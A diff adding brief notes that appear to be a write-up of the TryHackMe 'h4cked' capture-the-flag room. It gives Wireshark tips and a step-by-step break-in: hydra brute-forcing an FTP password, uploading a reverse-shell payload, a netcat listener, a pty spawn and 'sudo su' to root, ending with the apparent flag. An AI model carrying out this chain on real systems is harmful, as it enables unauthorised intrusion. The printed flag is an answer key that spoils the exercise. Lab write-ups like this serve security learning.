@@ -1,0 +1,24 @@
+Oh no! W've been hacked!
+-------------------------
+To export from a packet, select packet, select which section to export, and use File > Export Packet Dissections
+To view text from TCP packet, right click on the packet and select "Follow" > "TCP Stream"
+Rootkit - a type of backdoor
+
+
+Hack your way back into the machine
+------------------------------------
+*https://overide.medium.com/h4cked-tryhackme-writeup-3f00703df636 for more info
+*Look at what the hacker did on the .pcapng file to find what to do here
+1. Open terminal
+2. Download list of commonly used passwords
+3. hydra -l jenny -P <password list> <ip address of target> ftp
+4. ftp <ip address of machine>
+5. Enter 'jenny' as username and enter password found
+6. Copy the text of the payload in the .pcapng file in to a file, modify the ip variable to your attacking machine's ip address
+7. Upload the payload to the ftp server using "put <filename>" and change the permissions to allow it to run with "chmod +x <filename>"
+8. Listen to the port that we set on the payload (default was 1234) with netcat "nc -nvlp 1234"
+9. Go to a web browser and run the script with "<target ip address>/<script name>"
+10. Netcat should have shell now, use "python3 -c ‘import pty;pty.spawn(“/bin/bash”)" like the attacker did
+11. Use "sudo su" to get root perms and find the flag
+
+ebcefd66ca4b559d17b440b6e67fd0fd
